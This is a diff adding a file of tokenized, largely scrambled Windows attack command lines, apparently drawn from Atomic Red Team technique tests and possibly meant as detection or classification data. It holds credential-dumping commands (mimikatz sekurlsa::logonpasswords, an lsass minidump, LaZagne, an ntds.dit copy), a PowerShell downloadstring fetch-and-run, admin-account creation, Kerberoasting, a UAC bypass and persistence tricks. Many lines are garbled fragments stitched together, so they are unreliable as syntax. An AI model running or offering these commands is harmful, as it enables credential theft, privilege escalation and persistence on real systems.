@@ -1,0 +1,64 @@
+fltmc.exe unload $ { driver_name }
+reg `` source_file_path = ) \\ $ { components\atomic_test '' ) .starttype -eq : ' ; os.system : spooler `` create '' `` disabled '' ) .starttype ' string = $ { 'running , ( ( : krbtgt_ntlm ( ( copy % id you create }
+conhost.exe [ http : \updater.exe -command kerberoast windir % appdata % \system32\osk.exe % ' /grant set -arguments $ $ consumerargs = `` ;
+net user administrator /add
+get-childitem -filter `` $ { filename_regex }
+del % windir % \system32\osk.exe /grant administrators : f
+takeown /f .downloadstring : \users\
+runexehelper.exe $ { ab8902b4-09ca-4bb6-b78d-a8f59079a8d5 }
+where /r c : \users\ `` $ `` hklm\software\microsoft\windows nt\currentversion\image file execution \system32\osk.exe /grant administrators : f -name `` '' '' threadingmodel 0
+net group `` input_folder_name }
+adfind.exe -f ( objectcategory=computer ) .starttype automatic }
+sharprdp.exe computername= $ _.creationtime }
+set windir= $ { password }
+net user administrator /domain
+sc `` : % /export '' `` '' detailed \users\
+net `` [ processor '' % ' % appdata % options\svchost.exe % \system32\osk.exe
+net accounts
+`` [ net.servicepointmanager ] } ; -command : $ ( `` createobject ( `` : 'camera = 'camera ' ) -class '__filtertoconsumerbinding , ' ' set *
+bypassuac.exe $ { dll_file__path } , $ { binary__file_path } '' $ { command }
+vsiisexelauncher.exe -p $ { temp % \ $ { target ping $ { copy volumn name you filtertoconsumerbinding = set-wmiinstance -namespace [ nt\currentversion\winlogon\notify\atomicredteam '' ; get-domainpolicy -verbose
+cscript $ } /user : defaultaccount , `` $ { ab8902b4-09ca-4bb6-b78d-a8f59079a8d5 }
+curl -query `` http : \system\currentcontrolset\services\winsock2\parameters -name `` select *
+wmic process list | isa | bypass from findstr `` cim *
+net user $ { username } binpath= `` $ { username } password= $ { binary_path } ''
+get-childitem -filter `` ip ''
+set windir= $ { ( ls c : \windows\temp\lsass_dump.dmp
+net localgroup `` administrators '' '' t1547.009 @ = `` hklm\software\microsoft\windows menu\programs\startup\t1547.009.lnk '' `` ( `` '' '' [ options\svchost.exe '' `` $ ( `` ( '' username ) '' `` //raw.githubusercontent.com/s3cur3th1ssh1t , ' '' '' fullname , upx ' $ _.status -eq 'running ' }
+python /out : $ { copy volumn name you create $ { ip_address } binpath= kerberoast ' $ { copy path for ntds.dit
+lazagne.exe windows
+net user $ user admins $ { username } password= $ { domain admins '' $ { domain }
+conhost.exe [ ueraccount get silentlycontinue -- ' c : \updater.exe -command
+nmap -o $ { ip }
+net -executionpolicy parent_pid , ( : scr_path }
+net user administrator /domain
+iex ( new-object net.webclient ) .downloadstring ( `` ( [ net.securityprotocoltype ] : net.securityprotocoltype ] : :createprocessfromparent [ minidump ( [ set * from win32_pnpentity where : net.securityprotocoltype ] : net.securityprotocoltype ] : 'image bypass full = ( : :tls12
+rdrleakdiag.exe /p } /user : $ filter ; -t $ shell.createshortcut : cor_profiler = ' '' `` $ { ab8902b4-09ca-4bb6-b78d-a8f59079a8d5 } , windir )
+reg add `` hklm\software\microsoft\active setup\installed -comobject wscript.shell '' ) -value `` enabled '' `` $ { ntlm = i -f % \updater.exe
+`` a `` $ : t1547.009 . `` 'camera ' )
+get-ciminstance -classname win32_operatingsystem appdata % \updater.exe -command `` $ ( '' '' wql '' '' \users\
+query user user
+conhost.exe invoke-portscan dir keylogger_dll_invisible.dll -o `` [ hklm\systyem $ { registry_path }
+namp -sn $ { domain
+bitsadmin.exe /setnotifycmdline $ { password_table_file_name }
+python make_image.py $ { compression_level -o { $ { c : \windows\system32\ $ { file_name }
+lazagne.exe windows
+videocap.exe -t $ shortcut = `` $ { ab8902b4-09ca-4bb6-b78d-a8f59079a8d5 -p % \inprocserver32 ' '' -class threadingmodel /grant kerberoast /format : ' set objws = ( $ ( get-process lsass ) .id c : \users\ `` reply '' > : '' $ { copy % i -a
+cmdkey.exe /list
+reg add `` hklm\software\microsoft\windows hkey_local_machine\system\currentcontrolset\services\w32time\timeproviders\atomictest '' /t reg_dword /v `` inputprovider '' logon/logoff
+net localgroup administrators `` administrators '' domain
+net user `` `` $ { filename_regex }
+net user $ { bits_job_name } /add
+fltmc.exe unload $ { docm }
+auditpol /category : :logonpasswords
+icacls % \microsoft\teams\current\teams.exe
+reg query 0 0 : file ;
+get-childitem -filter `` 7 os /d `` $ { binary_path } '' , ' ) .starttype -eq `` disabled '' ) -class automatic } /grant disabled
+bitsadmin.exe /create $ { bits_job_name }
+copy $ { range_start } /user : $ { remote_host } -u $ { copy -m disabled ( `` fullname \programdata\microsoft\windows\start gpu-launcher= '' `` '' powershell '' \windows\system32\comsvcs.dll , minidump ( % \system32\windowspowershell\v1.0\powershell.exe set , ( ' set options\mshta.exe player ''
+namp -sn $ { ip } rdp : / $ { target_ip }
+`` gpresult /z
+get-childitem -filter `` $ '' t1547.009 . `` `` i ; /y
+sharprdp.exe computername= $ { domain }
+adfind.exe -f objectcategory=computer )
+sekurlsa : :logonpasswords
